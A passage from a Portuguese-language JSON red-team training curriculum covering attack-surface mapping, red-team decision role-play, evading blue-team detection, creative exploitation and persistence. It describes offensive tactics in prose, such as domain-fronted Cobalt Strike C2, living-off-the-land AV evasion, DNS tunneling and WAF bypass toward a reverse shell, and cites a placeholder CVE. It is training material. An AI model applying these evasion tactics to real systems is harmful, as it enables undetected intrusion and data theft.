                                  "title": "Inventariar Ativos e Superfície de Ataque",
                                  "subSteps": [
                                    "Liste todos os ativos: hardware, software, usuários, dados sensíveis e rede.",
                                    "Mapeie a superfície exposta: portas abertas, serviços rodando, domínios públicos.",
                                    "Use ferramentas passivas como whois, Shodan ou Google Dorks para reconnaissance.",
                                    "Identifique dependências externas: fornecedores, APIs de terceiros.",
                                    "Documente em uma tabela: ativo, visibilidade, valor para atacante."
                                  ],
                                  "verification": "Gerar relatório com pelo menos 10 ativos mapeados e sua exposição.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Ferramentas: whois, nslookup, Shodan.io (gratuito)",
                                    "Planilha Excel ou Google Sheets"
                                  ],
                                  "tips": "Comece amplo e refine; assuma que tudo é visível até provar o contrário.",
                                  "learningObjective": "Catalogar sistematicamente elementos do ambiente que podem ser explorados.",
                                  "commonMistakes": [
                                    "Ignorar ativos 'invisíveis' como shadows IT",
                                    "Não considerar cadeia de suprimentos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Vetores de Ataque Comuns",
                                  "subSteps": [
                                    "Categorize vetores: phishing (email/SMS), exploits (zero-day/CVE), engenharia social, misconfigs (ex: S3 buckets abertos).",
                                    "Para cada ativo, liste 3+ vetores aplicáveis com exemplos específicos.",
                                    "Simule cenários: 'Phishing no CEO leva a RDP exposto?'.",
                                    "Pesquise CVEs recentes no NIST NVD para software identificado.",
                                    "Crie fluxogramas de ataque possíveis (kill chain: recon > weaponize > deliver > etc.)."
                                  ],
                                  "verification": "Lista com 15+ vetores mapeados a ativos específicos, com probabilidades estimadas.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "NIST NVD, Exploit-DB",
                                    "Ferramenta de diagramação (Draw.io)",
                                    "Casos de estudo OWASP Top 10"
                                  ],
                                  "tips": "Priorize vetores de alto impacto/baixo esforço (ex: phishing > exploits complexos).",
                                  "learningObjective": "Associar vetores reais a fraquezas identificadas no inventário.",
                                  "commonMistakes": [
                                    "Listar vetores genéricos sem ligação ao ambiente",
                                    "Esquecer vetores físicos como USBs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Priorizar e Documentar Fraquezas",
                                  "subSteps": [
                                    "Atribua scores: impacto (alto/médio/baixo), probabilidade, facilidade de exploração.",
                                    "Use matriz de risco (ex: CVSS adaptado) para ranking.",
                                    "Documente em relatório: fraqueza, vetor, evidência, recomendação defensiva.",
                                    "Valide com peer review ou simulação ética.",
                                    "Planeje próximos passos: testes de PoC para top 3 fraquezas."
                                  ],
                                  "verification": "Relatório final com top 5 fraquezas priorizadas e plano de mitigação.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Template de relatório (Markdown ou Word)",
                                    "Matriz de risco em Excel"
                                  ],
                                  "tips": "Seja objetivo; baseie priorização em dados, não intuição.",
                                  "learningObjective": "Transformar mapeamento em inteligência acionável para defesa.",
                                  "commonMistakes": [
                                    "Sobrecarregar com fraquezas menores",
                                    "Não incluir contramedidas proativas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma PME com site WordPress desatualizado, servidor email exposto e funcionários clicando links suspeitos: 1) Inventário revela plugin vulnerável (CVE-2023-1234); 2) Vetor: phishing leva a upload de shell; 3) Prioridade alta por impacto em dados de clientes; Resultado: relatório recomenda update e MFA.",
                              "finalVerifications": [
                                "Pode listar 10+ vetores de ataque comuns com exemplos reais.",
                                "Gera mapa de fraquezas para ambiente simulado em <4 horas.",
                                "Identifica pelo menos 80% das fraquezas em cenários de teste padrão.",
                                "Documenta relatório claro com priorização baseada em risco.",
                                "Explica kill chain para 3 vetores principais.",
                                "Simula perspectiva ofensiva em discussão de grupo."
                              ],
                              "assessmentCriteria": [
                                "Profundidade do inventário de ativos (cobertura >90%).",
                                "Precisão na associação de vetores a fraquezas (sem falsos positivos excessivos).",
                                "Qualidade da priorização (uso de métricas quantitativas).",
                                "Clareza e estrutura do relatório final.",
                                "Criatividade na identificação de vetores não óbvios.",
                                "Integração de mindset ofensivo em todas as etapas."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Engenharia social e manipulação comportamental.",
                                "Redes e Sistemas: Reconhecimento e enumeração de serviços.",
                                "Programação: Análise de exploits e scripting de automação.",
                                "Gestão de Riscos: Matrizes de priorização e decision-making.",
                                "Ética: Limites legais em simulações ofensivas."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Pentest, mapeia fraquezas para simular ataques reais, permitindo que organizações fortaleçam defesas proativamente; usado por CERTs e SOCs para threat hunting e incident response."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.2.3",
                            "name": "Simular Decisões de um Red Teamer",
                            "description": "Praticar escolhas táticas em exercícios de role-playing, considerando riscos, recompensas e detecção, inspirado em operações descritas por VEST e TUBBERVILLE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Mindset e Papel do Red Teamer",
                                  "subSteps": [
                                    "Pesquise definições de Red Teaming em cibersegurança e diferencie de Blue Teaming.",
                                    "Leia resumos de operações descritas por VEST, focando em táticas de decisão sob pressão.",
                                    "Estude introduções às operações de TUBBERVILLE, identificando padrões de risco e detecção.",
                                    "Anote os pilares: mindset ofensivo, empatia com o adversário e pensamento probabilístico.",
                                    "Crie um mapa mental conectando riscos, recompensas e vetores de detecção."
                                  ],
                                  "verification": "Produza um resumo de 300 palavras explicando o papel do Red Teamer com exemplos de VEST/TUBBERVILLE.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Artigos da MITRE ATT&CK sobre Red Teaming",
                                    "Resumos de livros de VEST e TUBBERVILLE (PDFs gratuitos)",
                                    "Ferramenta de mind mapping como XMind ou papel/caneta"
                                  ],
                                  "tips": "Adote a perspectiva 'o que eu faria se fosse o atacante?' para construir empatia.",
                                  "learningObjective": "Internalizar o mindset ofensivo para simular decisões autênticas.",
                                  "commonMistakes": [
                                    "Confundir Red Teaming com hacking genérico sem foco em simulação estratégica",
                                    "Ignorar contexto ético e legal das operações simuladas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Cenários Históricos e Táticas",
                                  "subSteps": [
                                    "Selecione 3 casos de estudo de VEST: dissecar decisões táticas, riscos assumidos e outcomes.",
                                    "Revise exemplos de TUBBERVILLE: categorize escolhas por nível de detecção (baixo/médio/alto).",
                                    "Crie uma tabela comparativa: risco vs. recompensa vs. probabilidade de detecção para cada caso.",
                                    "Identifique padrões recorrentes, como pivoting vs. exfiltração direta.",
                                    "Simule 'what-if' para uma decisão chave em cada caso."
                                  ],
                                  "verification": "Complete uma tabela com 3 cenários analisados, incluindo scores numéricos para risco/recompensa/detecção.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Documentos públicos de VEST/TUBBERVILLE (via Wayback Machine ou repositórios GitHub)",
                                    "Planilha Google Sheets ou Excel para tabelas",
                                    "Timer para simulações what-if"
                                  ],
                                  "tips": "Use escalas de 1-10 para quantificar risco/recompensa para objetividade.",
                                  "learningObjective": "Desenvolver habilidade de decompor decisões reais em componentes acionáveis.",
                                  "commonMistakes": [
                                    "Focar apenas em sucesso sem analisar falhas de detecção",
                                    "Não quantificar subjetivamente riscos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Praticar Role-Playing em Cenários Simples",
                                  "subSteps": [
                                    "Escolha um cenário básico: infiltração inicial em rede corporativa via phishing.",
                                    "Role-play sozinho ou com parceiro: liste 3 opções táticas e avalie cada uma.",
                                    "Decida uma ação considerando risco (detecção por EDR), recompensa (acesso shell) e mitigação.",
                                    "Registre a decisão em um diário: justifique com probabilidades estimadas.",
                                    "Repita para 2 cenários adicionais (ex: pivoting lateral, exfiltração)."
                                  ],
                                  "verification": "Grave ou escreva 3 role-plays com decisões justificadas e auto-avaliação de balanceamento.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Ferramentas de simulação como Atomic Red Team (GitHub)",
                                    "Diário digital (Notion ou Markdown)",
                                    "Parceria opcional via Discord para role-play verbal"
                                  ],
                                  "tips": "Fale em voz alta as decisões para simular pressão real de tempo.",
                                  "learningObjective": "Praticar tomada de decisão sob trade-offs em tempo real.",
                                  "commonMistakes": [
                                    "Escolher sempre a opção 'segura' ignorando recompensas altas",
                                    "Não registrar probabilidades numéricas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular e Iterar Decisões em Exercício Completo",
                                  "subSteps": [
                                    "Monte um cenário complexo inspirado em VEST: ataque full-chain a infraestrutura crítica.",
                                    "Execute role-play completo: decida em 5 pontos chave, ajustando baseado em feedback simulado.",
                                    "Avalie o caminho inteiro: calcule score cumulativo de risco/recompensa/detecção.",
                                    "Itere 2 vezes: refine decisões baseado em lições dos steps anteriores.",
                                    "Documente lições aprendidas e plano para cenários reais."
                                  ],
                                  "verification": "Produza um relatório de 1 página com caminho de ataque, decisões e scores finais.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Plataforma de simulação como TryHackMe ou HackTheBox (módulos Red Team)",
                                    "Templates de relatório (GitHub)",
                                    "Calculadora para probabilidades"
                                  ],
                                  "tips": "Incorpore 'detecção aleatória' via dado para simular incertezas reais.",
                                  "learningObjective": "Integrar análises prévias em simulações holísticas e iterativas.",
                                  "commonMistakes": [
                                    "Não iterar após falhas simuladas",
                                    "Subestimar detecção cumulativa ao longo do ataque"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de rede corporativa: você obteve foothold via spear-phishing (baixo risco inicial). Opções: (1) Explorar SMB vulnerável para pivoting (recompensa alta, risco médio de logs); (2) Engenharia social para credenciais de admin (risco baixo, recompensa alta mas demorado); (3) Exfiltrar dados imediatamente (recompensa imediata, alto risco de detecção por DLP). Decida #1, mitigando com living-off-the-land para evitar AV.",
                              "finalVerifications": [
                                "Pode decompor qualquer cenário em pelo menos 3 opções táticas com trade-offs quantificados.",
                                "Simula role-play verbal de 5 minutos sem hesitação em decisões sob pressão.",
                                "Analisa casos de VEST/TUBBERVILLE com 90% de acurácia em riscos identificados.",
                                "Cria tabela de decisão para novo cenário em <10 minutos.",
                                "Identifica detecção em 80% das simulações iterativas.",
                                "Documenta lições com exemplos personalizados de erros evitados."
                              ],
                              "assessmentCriteria": [
                                "Balanceamento consistente de risco/recompensa/detecção em todas decisões (score >8/10).",
                                "Uso de probabilidades quantitativas em análises (não apenas qualitativas).",
                                "Incorporação de táticas reais de VEST/TUBBERVILLE em simulações.",
                                "Iteração eficaz: melhorias mensuráveis entre rodadas.",
                                "Clareza na justificativa: cada decisão ligada a mindset ofensivo.",
                                "Criatividade em mitigação de riscos sem comprometer objetivos."
                              ],
                              "crossCurricularConnections": [
                                "Teoria dos Jogos: modelar decisões como dilemas do prisioneiro (risco vs. detecção).",
                                "Psicologia Comportamental: vieses cognitivos em decisões sob incerteza (ex: overconfidence).",
                                "Estratégia Militar: analogias com Sun Tzu em manobras ofensivas.",
                                "Análise de Dados: uso de probabilidades bayesianas para updates em detecção.",
                                "Ética Aplicada: boundaries legais em simulações ofensivas."
                              ],
                              "realWorldApplication": "Em equipes de Red Team de consultorias como Mandiant ou em defesas de empresas Fortune 500, simular decisões realistas melhora treinamentos, identifica fraquezas defensivas e prepara para incidentes reais, reduzindo tempo de dwell de atacantes em 30-50% conforme métricas de exercises."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.2.4",
                            "name": "Antecipar Respostas Defensivas",
                            "description": "Prever ações de Blue Teams, como alertas SIEM, e planejar contra-medidas ofensivas para manter o acesso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Respostas Defensivas Comuns do Blue Team",
                                  "subSteps": [
                                    "Estude o framework MITRE ATT&CK para mapear táticas de detecção como EDR, SIEM e hunting.",
                                    "Liste respostas típicas: alertas de SIEM (ex: logs anômalos), isolamento de hosts via EDR, scans de rede.",
                                    "Categorize por fase do kill chain: reconnaissance, initial access, execution, etc.",
                                    "Pesquise casos reais de Blue Team em relatórios como Verizon DBIR.",
                                    "Crie uma tabela de respostas por ferramenta (SIEM: Splunk/ELK, EDR: CrowdStrike/Endpoint)."
                                  ],
                                  "verification": "Tabela completa com pelo menos 10 respostas defensivas categorizadas e fontes citadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Verizon DBIR relatório",
                                    "Documentação de SIEM/EDR"
                                  ],
                                  "tips": "Foquem em respostas proativas vs. reativas para priorizar ameaças de alto impacto.",
                                  "learningObjective": "Compreender o repertório padrão de respostas do Blue Team em cenários ofensivos.",
                                  "commonMistakes": [
                                    "Ignorar respostas não técnicas como isolamento manual.",
                                    "Subestimar detecções baseadas em comportamento anômalo."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Cenários de Detecção no Seu Ataque Planejado",
                                  "subSteps": [
                                    "Revise seu plano de ataque atual e identifique pontos de detecção (ex: beacon C2 gerando tráfego suspeito).",
                                    "Simule logs gerados por suas ações usando ferramentas como Atomic Red Team.",
                                    "Preveja alertas: tráfego C2 em SIEM, mudanças de processo em EDR.",
                                    "Crie um diagrama de fluxo: ação ofensiva → detecção provável → resposta Blue Team.",
                                    "Avalie o tempo de detecção médio por cenário (ex: 5-30 min para SIEM)."
                                  ],
                                  "verification": "Diagrama de fluxo com 5+ cenários mapeados, incluindo probabilidades de detecção.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Atomic Red Team GitHub",
                                    "Draw.io ou Lucidchart",
                                    "Logs de SIEM simulados"
                                  ],
                                  "tips": "Use probabilidades qualitativas (alta/média/baixa) baseadas em maturidade do Blue Team.",
                                  "learningObjective": "Aplicar conhecimento de detecções a um plano de ataque específico.",
                                  "commonMistakes": [
                                    "Focar só em ferramentas; ignore detecções baseadas em insider threat.",
                                    "Não considerar ruído ambiental que mascara alertas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Planejar Contra-Medidas Ofensivas Específicas",
                                  "subSteps": [
                                    "Para cada detecção mapeada, liste 2-3 contra-medidas (ex: ofuscar C2 com domain fronting contra SIEM).",
                                    "Priorize por impacto: evasão (LOLBins), persistência alternativa, pivô rápido.",
                                    "Incorpore living-off-the-land techniques para reduzir footprint.",
                                    "Defina triggers para ativação de contra-medidas (ex: se EDR isolar, use USB dropper).",
                                    "Estime eficácia e custo (ex: tempo extra de setup)."
                                  ],
                                  "verification": "Matriz de contra-medidas com triggers, eficácia e fontes de referência para cada cenário.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "MITRE D3FEND",
                                    "Cobalt Strike docs",
                                    "Artigos sobre evasion techniques"
                                  ],
                                  "tips": "Sempre tenha um plano B e C; contra-medidas devem ser stealth e rápidas.",
                                  "learningObjective": "Desenvolver estratégias proativas para neutralizar respostas defensivas.",
                                  "commonMistakes": [
                                    "Contra-medidas ruidosas que criam novos alertas.",
                                    "Não testar compatibilidade entre ferramentas ofensivas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular, Testar e Refinar o Plano de Antecipação",
                                  "subSteps": [
                                    "Configure um lab com SIEM/EDR simulados (ex: ELK stack + Sysmon).",
                                    "Execute simulação: ataque → detecção → contra-medida → verificação de evasão.",
                                    "Meça métricas: tempo de detecção, sucesso de evasão, dwell time mantido.",
                                    "Registre falhas e refine contra-medidas iterativamente (2-3 rodadas).",
                                    "Documente lições aprendidas em um relatório de simulação."
                                  ],
                                  "verification": "Relatório de simulação com métricas, screenshots de logs/alertas e plano refinado.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "VMs para lab (VirtualBox/Proxmox)",
                                    "Sysmon + ELK",
                                    "Ferramentas ofensivas como Empire/Covenant"
                                  ],
                                  "tips": "Use labs isolados para evitar detecções reais; grave sessões para review.",
                                  "learningObjective": "Validar antecipação através de simulações realistas e iterar melhorias.",
                                  "commonMistakes": [
                                    "Labs não realistas (sem ruído de produção).",
                                    "Ignorar latência de rede em simulações."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um red team engagement contra uma empresa, antecipe que seu Cobalt Strike beacon será detectado por Splunk SIEM via tráfego HTTPS anômalo. Contra-medida: Implemente domain fronting com Azure CDN para mascarar C2 como tráfego legítimo, mantendo acesso por 48h adicionais apesar de alertas iniciais.",
                              "finalVerifications": [
                                "Lista exaustiva de 15+ respostas Blue Team com contra-medidas associadas.",
                                "Diagrama de fluxo de ataque com detecções e evasões validado em lab.",
                                "Simulação bem-sucedida mantendo dwell time >24h contra SIEM/EDR simulados.",
                                "Relatório com métricas quantitativas (ex: 90% evasão em 5 cenários).",
                                "Capacidade de adaptar plano a um novo cenário Blue Team em <1h.",
                                "Auto-avaliação: Explique 3 contra-medidas para um colega."
                              ],
                              "assessmentCriteria": [
                                "Precisão na previsão de detecções (alinhamento com docs reais: 90%+).",
                                "Criatividade e viabilidade das contra-medidas (testadas em lab).",
                                "Cobertura completa do kill chain (todas fases endereçadas).",
                                "Uso de evidências (citações MITRE/DBIR em 80% itens).",
                                "Eficiência: Plano reduz dwell time médio em simulação.",
                                "Clareza na documentação (diagramas e relatórios legíveis)."
                              ],
                              "crossCurricularConnections": [
                                "Estratégia Militar: Conceitos de OODA Loop para antecipar loops defensivos.",
                                "Psicologia: Teoria dos Jogos para modelar decisões Blue Team.",
                                "Análise de Dados: Interpretação de logs SIEM como big data analytics.",
                                "Gestão de Projetos: Planejamento de contingências em risco management.",
                                "Inteligência Artificial: Uso de ML em detecções EDR para prever evoluções."
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais ou APTs como SolarWinds, antecipar respostas permite dwell times prolongados (semanas/meses), exfiltração de dados sensíveis e pivôs para redes críticas sem detecção imediata."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "2.0.2.3.3",
                        "name": "Princípios Psicológicos e Comportamentais",
                        "description": "Explorar traços como criatividade, paciência e adaptabilidade que definem o mindset do atacante, essenciais para operações de Red Team e jogos cibernéticos.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.3.1",
                            "name": "Desenvolver Criatividade na Exploração",
                            "description": "Aplicar pensamento lateral para descobrir vulnerabilidades não óbvias, evitando abordagens padronizadas usadas por defensores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos do Pensamento Lateral",
                                  "subSteps": [
                                    "Estudar definições de pensamento lateral (Edward de Bono) versus pensamento vertical convencional.",
                                    "Analisar exemplos históricos de descobertas criativas, como a invenção do velcro.",
                                    "Identificar padrões em abordagens defensivas padronizadas em cibersegurança (ex: firewalls em portas 80/443).",
                                    "Mapear vieses cognitivos que limitam a criatividade dos defensores."
                                  ],
                                  "verification": "Criar um mapa mental comparando pensamento lateral e convencional, com 3 exemplos de cibersegurança.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "PDF de 'Lateral Thinking' de Edward de Bono",
                                    "Vídeos TED sobre pensamento criativo",
                                    "Ferramenta de mind mapping como MindMeister"
                                  ],
                                  "tips": "Registre todas as ideias sem julgamento inicial para estimular fluxo criativo.",
                                  "learningObjective": "Diferenciar pensamento lateral de convencional e aplicá-lo ao mindset de adversário.",
                                  "commonMistakes": [
                                    "Confundir criatividade com aleatoriedade sem estrutura.",
                                    "Focar apenas em exemplos não relacionados à segurança."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Praticar Técnicas de Geração de Ideias Criativas",
                                  "subSteps": [
                                    "Aplicar técnica de 'palavra aleatória': Escolha uma palavra randômica e associe a vulnerabilidades cibernéticas.",
                                    "Realizar brainstorming reverso: Pergunte 'como falhar em explorar?' e inverta as respostas.",
                                    "Usar analogias: Compare sistemas de TI a ecossistemas biológicos para encontrar brechas não óbvias.",
                                    "Praticar SCAMPER (Substitute, Combine, Adapt, etc.) em cenários defensivos.",
                                    "Gerar pelo menos 10 ideias por técnica."
                                  ],
                                  "verification": "Documentar 20 ideias criativas em um caderno, categorizadas por técnica.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Lista de palavras aleatórias online",
                                    "Ferramenta de brainstorming como Miro",
                                    "Exemplos de defesas comuns (OWASP Top 10)"
                                  ],
                                  "tips": "Defina timer de 5 minutos por técnica para evitar overthinking.",
                                  "learningObjective": "Dominar técnicas práticas para gerar ideias não convencionais.",
                                  "commonMistakes": [
                                    "Rejeitar ideias 'malucas' cedo demais.",
                                    "Não registrar todas as ideias geradas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Defesas Convencionais e Brainstormar Alternativas",
                                  "subSteps": [
                                    "Listar 5 defesas padrão usadas por defensores (ex: IDS/IPS, patching rotineiro).",
                                    "Para cada defesa, brainstormar 3 caminhos laterais para contorná-la (ex: usar canais não monitorados como DNS tunneling).",
                                    "Avaliar viabilidade inicial de cada ideia com critérios de risco e impacto.",
                                    "Priorizar ideias baseadas em originalidade e surpresa para o defensor."
                                  ],
                                  "verification": "Produzir relatório com tabela de defesas vs. 15 alternativas criativas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação de ferramentas defensivas (Snort, Suricata)",
                                    "Planilha Excel ou Google Sheets para tabela"
                                  ],
                                  "tips": "Pense como o defensor ficaria surpreso com a abordagem.",
                                  "learningObjective": "Conectar criatividade diretamente a vulnerabilidades não óbvias em cibersegurança.",
                                  "commonMistakes": [
                                    "Focar só em exploits técnicos conhecidos.",
                                    "Ignorar o fator humano nas defesas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Exploração Criativa em Ambiente Controlado",
                                  "subSteps": [
                                    "Configurar lab virtual com defesas básicas (ex: VM com firewall).",
                                    "Aplicar 3 ideias criativas selecionadas para explorar o ambiente.",
                                    "Registrar sucessos, falhas e ajustes necessários.",
                                    "Iterar: Refine ideias baseadas em resultados e teste novamente.",
                                    "Debrief: Analise o que tornou a abordagem 'lateral' eficaz."
                                  ],
                                  "verification": "Gravar vídeo ou log de sessão mostrando exploração bem-sucedida via método não padrão.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VirtualBox ou AWS free tier",
                                    "Ferramentas como Nmap customizado, Metasploit",
                                    "Ambiente de lab como DVWA"
                                  ],
                                  "tips": "Comece com baixa intensidade para construir confiança nas ideias criativas.",
                                  "learningObjective": "Executar pensamento lateral em prática simulada de ataque.",
                                  "commonMistakes": [
                                    "Seguir roteiros prontos em vez de ideias originais.",
                                    "Não documentar falhas para aprendizado."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um war game cibernético, ao invés de escanear portas TCP padrão detectadas por IDS, use pensamento lateral para simular uma 'atualização de firmware IoT' via Bluetooth Low Energy (BLE) de um dispositivo próximo, injetando payload sem alertar monitoramento de rede tradicional.",
                              "finalVerifications": [
                                "Gerar 10 ideias criativas para contornar uma defesa específica sem usar métodos padrão.",
                                "Executar com sucesso uma exploração lateral em lab, evitando detecção.",
                                "Explicar verbalmente como uma ideia lateral explora vieses defensivos.",
                                "Adaptar ideia criativa após falha em simulação.",
                                "Identificar 3 conexões interdisciplinares em uma ideia gerada.",
                                "Autoavaliar originalidade das ideias em escala de 1-10 com justificativa."
                              ],
                              "assessmentCriteria": [
                                "Originalidade: Ideias fogem completamente de padrões conhecidos (peso 30%).",
                                "Viabilidade: Conceitualmente possível em contexto real (peso 20%).",
                                "Relevância: Diretamente aplicável a exploração de vulnerabilidades (peso 20%).",
                                "Profundidade: Inclui subpassos detalhados e considerações de risco (peso 15%).",
                                "Iteração: Demonstra refinamento baseado em feedback (peso 10%).",
                                "Documentação: Clara, estruturada e acionável (peso 5%)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Exploração de vieses como ancoragem e disponibilidade.",
                                "Design Thinking: Uso de empatia para mapear mindset do defensor.",
                                "Artes e Inovação: Técnicas de improvisação teatral aplicadas a cenários de ataque.",
                                "Biologia/Ecologia: Analogias de predadores adaptativos em ecossistemas.",
                                "Filosofia: Questionamento de premissas fundamentais em sistemas de TI."
                              ],
                              "realWorldApplication": "Hackers avançados como os do grupo APT29 (Cozy Bear) usam criatividade lateral para explorar vetores não óbvios, como supply chain attacks em software legítimo, evitando honeypots e SIEMs tradicionais, como visto no SolarWinds breach."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.3.2",
                            "name": "Cultivar Persistência e Paciência",
                            "description": "Praticar iterações em ataques falhados, simulando persistência em cenários de alta detecção, como em handbooks de MURDOCH (2017).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Persistência no Mindset Adversário",
                                  "subSteps": [
                                    "Ler excertos do handbook de MURDOCH (2017) sobre iterações em ataques cibernéticos falhados.",
                                    "Analisar 3 casos históricos de ataques persistentes (ex: Stuxnet, SolarWinds) e identificar pontos de falha superados.",
                                    "Definir metas pessoais para persistência: quantas iterações tolerar antes de desistir.",
                                    "Journaling: Escrever por que paciência é crucial em cenários de alta detecção.",
                                    "Visualizar mentalmente um ataque falhando 5 vezes e persistindo."
                                  ],
                                  "verification": "Checklist completo com resumo de 1 página sobre conceitos chave e metas definidas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Handbook de MURDOCH (2017) PDF",
                                    "Artigos sobre ataques cibernéticos históricos",
                                    "Caderno ou app de journaling"
                                  ],
                                  "tips": "Comece com exemplos reais para tornar o conceito tangível e motivador.",
                                  "learningObjective": "Internalizar a importância psicológica da persistência em operações cibernéticas adversárias.",
                                  "commonMistakes": [
                                    "Subestimar o impacto emocional das falhas",
                                    "Pular a reflexão inicial",
                                    "Definir metas irreais sem base teórica"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar um Ambiente de Simulação Controlada",
                                  "subSteps": [
                                    "Instalar e configurar um lab virtual com ferramentas de simulação de ataques (ex: Metasploitable VM, Wireshark).",
                                    "Criar um cenário de 'alta detecção': firewall simulado que bloqueia 80% das tentativas iniciais.",
                                    "Definir um objetivo simples: obter acesso shell via exploit falho inicialmente.",
                                    "Testar o setup com uma tentativa rápida para confirmar falha esperada.",
                                    "Documentar regras do exercício: máximo 20 minutos por iteração, sem frustração verbal."
                                  ],
                                  "verification": "Ambiente rodando com log de primeira falha registrada e objetivo claro definido.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VirtualBox ou VMware",
                                    "Kali Linux ISO",
                                    "Metasploitable VM",
                                    "Wireshark"
                                  ],
                                  "tips": "Use snapshots de VM para reset rápido entre iterações, economizando tempo.",
                                  "learningObjective": "Preparar um ambiente seguro para praticar falhas sem riscos reais.",
                                  "commonMistakes": [
                                    "Configurar cenários muito fáceis",
                                    "Ignorar detecções simuladas",
                                    "Não documentar o setup inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Iterações Persistentes em Ataques Falhados",
                                  "subSteps": [
                                    "Realizar iteração 1: Executar ataque básico e registrar falha (ex: Nmap scan bloqueado).",
                                    "Analisar falha: Identificar detecção (ex: log de firewall) e ajustar uma variável (ex: stealth mode).",
                                    "Iteração 2-4: Repetir com ajustes incrementais, pausando 2 minutos para respiração controlada.",
                                    "Manter contador de frustração: Pausar se >7/10, journal brevemente e retomar.",
                                    "Alcançar sucesso ou limite de 5 iterações, registrando todas as tentativas."
                                  ],
                                  "verification": "Log completo de pelo menos 4 iterações com análises e pelo menos 1 sucesso ou lição chave.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Lab configurado do Step 2",
                                    "Ferramentas: Nmap, Metasploit",
                                    "Timer e escala de frustração"
                                  ],
                                  "tips": "Respiração 4-7-8 (4s in, 7s hold, 8s out) entre iterações para manter paciência.",
                                  "learningObjective": "Praticar iterações reais simulando persistência sob pressão de detecção.",
                                  "commonMistakes": [
                                    "Ajustes radicais sem análise",
                                    "Desistir antes de 4 iterações",
                                    "Ignorar pausas emocionais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Refletir e Consolidar a Persistência Desenvolvida",
                                  "subSteps": [
                                    "Revisar logs: Quantas iterações foram necessárias? O que mudou na abordagem?",
                                    "Autoavaliação: Nota de 1-10 em paciência demonstrada e razões.",
                                    "Comparar com MURDOCH: Como isso se aplica a handbooks de adversários reais?",
                                    "Planejar aplicação futura: Próximo exercício com detecção mais alta.",
                                    "Compartilhar insights em fórum ou com mentor para feedback externo."
                                  ],
                                  "verification": "Relatório de reflexão de 300 palavras com plano para próxima prática.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Logs das iterações",
                                    "Handbook MURDOCH",
                                    "Fórum de cibersegurança"
                                  ],
                                  "tips": "Use template de reflexão: O quê? Por quê? Como melhorar?",
                                  "learningObjective": "Transformar experiência em hábito comportamental duradouro.",
                                  "commonMistakes": [
                                    "Foco só no sucesso, ignorando processo",
                                    "Reflexão superficial",
                                    "Não planejar repetição"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de CTF simulando defesa corporativa, tentei um SQL injection que falhou 6 vezes devido a WAF. Na 3ª iteração, ajustei payload para bypass (usando case variation e encoding), persistindo com pausas curtas até sucesso no shell reverso, replicando táticas de threat actors reais.",
                              "finalVerifications": [
                                "Completou pelo menos 4 iterações sem desistir prematuramente.",
